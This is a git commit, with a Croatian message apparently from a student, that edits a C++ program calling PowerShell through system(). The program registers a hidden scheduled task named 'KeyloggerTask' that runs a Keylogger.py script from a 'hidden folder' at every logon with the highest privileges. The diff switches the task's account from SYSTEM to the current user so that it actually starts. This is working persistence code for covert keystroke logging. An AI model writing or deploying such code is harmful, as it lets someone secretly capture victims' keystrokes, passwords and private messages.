cc8908ac9bc328db85a92ba1aa4c28c27332af47
B-nad <bnad22@student.foi.hr>
2025-02-06 17:18:52 +0100

    promjena usera
    User koji se koristi za pokretanje taska je bio system a sada je user koji je pokrenuo program, nije se pokretalo kada je user bio system

--- task kreator.cpp
+++ task kreator.cpp
@@ -3,7 +3,7 @@
 int main() {
 	
     // PowerShell skripta kao argument
-    const char* command = "powershell.exe -Command \"if (Get-ScheduledTask -TaskName 'KeyloggerTask' -ErrorAction SilentlyContinue) { Write-Output 'Task vec postoji.' } else { $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c \"C:\\skriveni_folder\\Keylogger.py\"'; $trigger = New-ScheduledTaskTrigger -AtLogon; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries:$true -DontStopIfGoingOnBatteries:$true; $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings; Register-ScheduledTask -TaskName 'KeyloggerTask' -InputObject $task }\"";
+    const char* command = "powershell.exe -Command \"if (Get-ScheduledTask -TaskName 'KeyloggerTask' -ErrorAction SilentlyContinue) { Write-Output 'Task vec postoji.' } else { $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c \"C:\\skriveni_folder\\Keylogger.py\"'; $trigger = New-ScheduledTaskTrigger -AtLogon; $principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries:$true -DontStopIfGoingOnBatteries:$true; $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings; Register-ScheduledTask -TaskName 'KeyloggerTask' -InputObject $task }\"";
 
     // Poziv cmd-a koji pokrece powershell sa argumentima
     system(command);
